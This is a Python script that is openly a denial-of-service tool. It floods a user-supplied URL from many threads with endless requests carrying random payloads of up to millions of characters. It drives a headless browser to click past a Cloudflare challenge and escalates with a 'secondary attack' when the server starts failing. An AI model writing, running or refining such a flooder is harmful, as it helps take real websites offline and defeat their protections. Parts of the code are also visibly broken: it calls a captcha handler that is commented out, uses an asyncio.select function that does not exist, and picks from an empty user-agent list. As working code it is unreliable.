import requests
import aiohttp
import asyncio
import random
import string
import ssl
import threading
import sys

from pyppeteer import launch

# Function to check if Cloudflare protection is present
async def check_cloudflare(page):
    button = await page.querySelector('.big-button.pow-button')
    if button:
        box = await button.boundingBox()
        return {'x': box['x'] + box['width'] / 2, 'y': box['y'] + box['height'] / 2}
    else:
        return False

# Function to handle ddgCaptcha
# async def handle_ddg_captcha(page):
    # Code to handle ddgCaptcha

url = input("url: ")
captcha = 'true'
precheck = 'true'

# Define headers for requests
headers = {
    "Accept-Language": "en-US,en;q=0.9",
    "Referer": "https://www.google.com/",
}

def generate_random_payload():
    length = random.randint(1, 9999999)
    text_characters = string.ascii_letters + string.digits + string.punctuation
    payload = "".join(random.choice(text_characters) for i in range(length))
    return payload

# Function to perform attack
async def perform_attack(target):
    session = aiohttp.ClientSession()
    context = ssl.create_default_context()

    while True:
        try:
            x = None
            try:
                x = requests.get(target, headers=headers, params={"payload": generate_random_payload()}, timeout=4)
            except requests.exceptions.RequestException as e:
                print("Error:", e)

            if x is not None and x.status_code == 200:
                browser = await launch()
                page = await browser.newPage()

                # Check for Cloudflare protection
                cloudflare = await page.evaluate(check_cloudflare)
                if cloudflare:
                    await page.hover('.big-button.pow-button')
                    await page.mouse.click(cloudflare['x'], cloudflare['y'])
                    await asyncio.sleep(6)  # Wait for 6 seconds

                    # Check for captcha (if enabled)
                    if captcha == 'true':
                        await handle_ddg_captcha(page)

                    # Send GET request with randomly generated payload
                    async with session.get(target, headers=headers, ssl=context) as response:
                        await response.text()

                    test = requests.get(target)
                    print("Testing request:", test.status_code)
                    await asyncio.sleep(0.1)

                elif x is not None and x.status_code == 403:
                    print("Block IP!!!")
                    break

                elif x is not None and x.status_code >= 500:
                    print("False back !!!, secondary attack")
                    session = aiohttp.ClientSession()
                    async with session.get(target) as response:
                        await response.text()

                await page.close()
                await browser.close()

            if sys.stdin in asyncio.select([sys.stdin], [], [], 0)[0]:
                break

        except Exception as e:
            print("Error:", e)

    await session.close()

# Select a random User-Agent from the User-Agent list
def get_random_user_agent():
    user_agents = [
        # List of user agents
    ]
    return random.choice(user_agents)

# Send request using a random User-Agent for each request
def send_request(url):
    headers.update({'User-Agent': get_random_user_agent()})
    session = requests.Session()

    try:
        response = session.get(url, headers=headers, timeout=3)

        if response.status_code == 200:
            print(f"Success request to {url}")
    except requests.exceptions.RequestException as e:
        print(f"Error request to {url}: {e}")

# Send requests without using proxy
def send_requests(url):
    asyncio.run(perform_attack(url))
    send_request(url)

# Create multiple threads to send requests
def create_threads(url, num_threads):
    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=send_requests, args=(url,))
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

# Start the program
while True:
    command = input("Enter command: ")
    if command == "exit":
        sys.exit()
    elif command == "start":
        num_threads = int(input("Enter the number of threads: "))
        create_threads(url, num_threads)
    else:
        print("Unknown command. Please enter 'start' to begin or 'exit' to exit the program.")
